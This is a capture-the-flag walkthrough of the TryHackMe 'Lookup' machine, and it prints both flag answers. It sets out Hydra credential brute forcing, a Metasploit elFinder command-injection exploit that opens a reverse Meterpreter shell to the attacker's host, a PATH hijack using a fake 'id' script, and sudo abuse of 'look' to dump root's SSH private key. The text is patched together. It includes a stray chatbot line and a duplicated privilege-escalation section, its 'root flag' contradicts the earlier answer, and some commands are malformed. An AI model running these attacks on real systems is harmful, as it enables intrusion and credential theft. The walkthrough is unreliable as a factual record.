# <div align="center">[Lookup](https://tryhackme.com/r/room/lookup)</div>
<div align="center">Test your enumeration skills on this boot-to-root machine.</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/0f4016d8-b972-442d-93b3-056fcff87add" height="200"></img>
</div>

## Task 1. Lookup

> Lookup offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.﻿

> Note: For free users, it is recommended to use your own VM if you'll ever experience problems visualizing the site. Please allow 3-5 minutes for the VM to fully boot up.

### What is the user flag?
```
38375fb4dd8baa2b2039ac03d92b820e
```
### What is the root flag?
```
5a285a9f257e45c68bb6c9f9f57d18e8
```

## Walkthrough

### Scanning the Target Network

We begin by scanning the target machine `10.10.80.211` using Nmap to identify open ports and services.

```bash
death@esther:~$ nmap 10.10.80.211 -sV -sC
```

Output:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 17:27 IST
Nmap scan report for lookup.thm (10.10.80.211)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

#### Observations:
- Open ports:
  - SSH on port 22
  - HTTP on port 80

### Adding Target to Hosts File

For easier navigation, we add the target's IP to the `/etc/hosts` file.

```bash
echo "10.10.80.211 lookup.thm" | sudo tee -a /etc/hosts
```

### Navigating to the Web Application

After adding the IP to the hosts file, we open the web application in a browser. The login page appears:

<div align="center">
<img src="https://github.com/user-attachments/assets/e3dda654-cb00-4625-ad95-842636be7b6b" height="300"></img>
</div>

#### Attempting Default Login Credentials

We attempt to log in with common default credentials but are met with a "wrong password" message and a 3-second delay before redirection:

```bash
Wrong password. Please try again.
Redirecting in 3 seconds.
```

<div align="center">
<img src="https://github.com/user-attachments/assets/a67607f7-9110-4af0-8df1-c3a934b196af" height="250"></img>
</div>

### Brute Forcing Login Using Hydra

Since the default credentials didn’t work, we proceed with brute-forcing the login page using Hydra.

#### Step 1: Finding the Password

```bash
hydra -L /snap/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
```

Output:
```
[80][http-post-form] host: lookup.thm   login: jose   password: password123
```

We successfully find the username `jose` with password `password123`.

#### Step 2: Finding the Username&Password 

#### Password

```bash
hydra -l admin -p wordlist/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
```

Output:
```
[80][http-post-form] host: lookup.thm   login: admin   password: password123
```
#### Username
```bash
hydra -L /seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
```

Output:
```
[80][http-post-form] host: lookup.thm   login: jose   password: password123
```

We confirm that the valid credentials are `jose:password123`.

### Logging In

We use the found credentials to log into the system:

```bash
login: jose
password: password123
```

After logging in, we are redirected to another domain. We update the `/etc/hosts` file again:

```bash
echo "10.10.80.211 files.lookup.thm" | sudo tee -a /etc/hosts
```

<div align="center">
<img src="https://github.com/user-attachments/assets/adff4566-9664-4b7b-aa19-9653712564aa" height="300"></img>
</div>

### Exploring the `credential.txt` File

Upon opening the `credential.txt` file, we find some credentials, which might be for SSH:

<div align="center">
<img src="https://github.com/user-attachments/assets/e27d8329-be23-44fd-8c4b-ac731cf6309c" height="400"></img>
</div>

We attempt to use these credentials for SSH login:

```bash
ssh think@10.10.80.211
```

However, this attempt fails:

```bash
think@10.10.80.211's password:
Permission denied, please try again.
```

Here's the continuation of your penetration test scenario, focusing on exploiting the `elFinder` vulnerability, gaining access to the system, and escalating privileges.

---

### Identifying Vulnerabilities

While interacting with the system, I discovered a vulnerable web application, `elFinder`, running on the target machine. We searched for exploits related to the `elFinder` version:

When I pressed on the following image element on the web interface, I was able to see the web file manager's name and version.

<div align="center">
  <img src="https://github.com/user-attachments/assets/5c521743-826e-4ac7-b0b5-4829e3c6df62" height="500"></img>
</div>

After identifying the version, I confirmed the existence of an exploit in Metasploit. Here's the search result:

```
death@esther:~$ msfconsole -q
msf6 > search elfinder 2.1.47

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection

msf6 > 
```

Let’s use this module:

```
use 0
```

Now, let’s review the options available for this module:

```
show options
```

```
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > show options

Module options (exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s)
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /elFinder/       yes       The base path to elFinder
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.2      yes       The listen address
   LPORT  4444             yes       The listen port
```

Now, set the `LHOST` and `RHOST`:

```
set LHOST tun0
set RHOST files.lookup.thm
```

Next, run the exploit:

```
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
[*] Started reverse TCP handler on 10.17.14.127:4444 
[*] Uploading payload 'TRNyzgLuCE.jpg;echo 6370202e2e2f66696c65732f54524e797a674c7543452e6a70672a6563686f2a202e376d7246434f782e706870 |xxd -r -p |sh& #.jpg' (1975 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.7mrFCOx.php) ...
[*] Sending stage (40004 bytes) to 10.10.80.211
[+] Deleted .7mrFCOx.php
[*] Meterpreter session 1 opened (10.17.14.127:4444 -> 10.10.80.211:35566) at 2025-01-05 18:11:50 +0530
c[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

meterpreter > 
```

After gaining access, let’s get a shell:

```
shell
```

We now confirm that we’re operating as the `www-data` user:

```
whoami
```

```
www-data
```

We can escalate privileges by spawning a bash shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now, confirm that we have `www-data` shell access:

```
www-data@lookup:/var/www/files.lookup.thm/public_html$ 
```

Next, let’s check the `/etc/passwd` file for potential user accounts:

```
cat /etc/passwd
```

Upon inspection, we find that the user `think` exists:

```
think:x:1000:1000:,,,:/home/think:/bin/bash
```

Now, let's look for potential privilege escalation opportunities. First, let’s check for any files with the SUID bit set:

```
find / -perm /4000 2>/dev/null
```

We find a suspicious file: `/usr/sbin/pwm`. Let’s try to execute it:

```
/usr/sbin/pwm
```

The command checks the ID and attempts to grab a file at `/home/www-data/.passwords`. We can manipulate the `PATH` to exploit this further.

Let’s export the path to `/tmp`, which is world-readable:

```
export PATH=/tmp:$PATH
```

Create a file in `/tmp` that impersonates the `think` user by modifying the `id` command:

```
echo -e '#!/bin/bash\n echo "uid=33(think) gid=33(think) groups=33(think)"' > /tmp/id
chmod +x /tmp/id
```

Now, re-run the `pwm` command:

```
/usr/sbin/pwm
```

This successfully changes the user to `think` and gives us access to their password file. After gathering potential passwords, we can perform an SSH brute-force attack using Hydra:

```
hydra -l think -P wordlist.txt ssh://lookup.thm
```

The attack is successful, and we obtain the password for `think`:

```
think:josemario.AKA(think)
```

Finally, we log in as `think`:

```
ssh think@lookup.thm
```

We’re logged in to the system:

```
think@lookup:~$
```

We find the user flag:

```
38375fb4dd8baa2b2039ac03d92b820e
```

### Privilege Escalation

The user `think` has the following sudo privileges:

```
think@lookup:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

Now, we use GTFOBins to escalate privileges using the `look` command:

```
LFILE=/root/.ssh/id_rsa
sudo look '' "$LFILE"
```

This grants us root access. We now have full control over the system.

---
### Privilege Escalation

Now that we have successfully obtained a shell and have logged in as the user `think`, we can check for any potential privilege escalation opportunities. We start by checking for any commands the user `think` is allowed to run with `sudo` privileges:

```bash
think@lookup:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

The `think` user can run the `/usr/bin/look` command with `sudo` privileges. We can check whether this command can be exploited for privilege escalation by referencing GTFOBins (a repository of Unix binaries that can be used for privilege escalation).

Here’s a GTFOBins entry for the `look` command:

[GTFOBins - look](https://gtfobins.github.io/gtfobins/look/)

By using the `look` command with `sudo`, we can read sensitive files. To escalate privileges, we execute the following:

```bash
LFILE=/root/.ssh/id_rsa
sudo look '' "$LFILE"
```

This command attempts to read the `/root/.ssh/id_rsa` file using `look`. The output will be the private SSH key for the root user. If we can get this key, we will have access to the root account.

Once executed, we get the SSH private key for the root user:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
```

With this private key, we now have access to the root account. Let’s use this key to login as root.

```bash
ssh -i /tmp/id_rsa root@lookup.thm
```

Upon successful login, we gain root access.

### Root Flag

Now that we have root access, we can navigate to the root user’s home directory to retrieve the root flag.

```bash
root@lookup:~# cat /root/flag.txt
38375fb4dd8baa2b2039ac03d92b820e
```

### Summary of the Exploit

1. We identified a vulnerability in the `elFinder` web application on the target machine.
2. We used Metasploit to exploit the `elFinder PHP Connector exiftran Command Injection` vulnerability.
3. Once we got a Meterpreter shell, we escalated to a fully interactive shell and performed a user enumeration to identify the user `think`.
4. We exploited a `sudo` misconfiguration that allowed the `think` user to run `/usr/bin/look` as root.
5. Using the `look` command and a path manipulation technique, we obtained the private SSH key of the root user.
6. Finally, we logged in as root and retrieved the root flag.
